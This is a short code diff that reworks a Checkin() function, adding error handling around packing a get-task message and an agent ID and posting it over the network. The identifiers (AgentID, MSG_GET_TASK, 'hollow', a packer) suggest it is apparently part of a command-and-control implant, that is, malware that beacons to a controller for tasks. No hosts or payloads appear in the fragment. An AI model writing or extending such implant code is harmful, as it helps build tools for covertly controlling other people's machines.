@@ -6,15 +6,19 @@
 
 
 BOOL Checkin() {
-	if (packager->PackerSize == 0) {
-		packager->Pack4(MSG_GET_TASK);
-		packager->Pack4(hollow->config->AgentID);
-	}
-
-	BOOL ok = g_NetMgr->DoPost(packager->PackerPointer(), (SIZE_T)packager->PackerSize())
-	if (!ok) {
+	if (!packager->PackerPointer() && !packager->NewPacker()) {
 		return FALSE;
 	}
+
+	if (packager->PackerSize() == 0) {
+		if (!packager->Pack4(MSG_GET_TASK)) { return FALSE; }
+		if (!packager->Pack4(hollow->config->AgentID)) { return FALSE; }
+	}
+
+	BOOL ok = g_NetMgr->DoPost(packager->PackerPointer(), (SIZE_T)packager->PackerSize());
+	if (!ok) {
+		return ok;
+	}
 	packager->ResetPacker();
-	return TRUE;
+	return ok;
 }
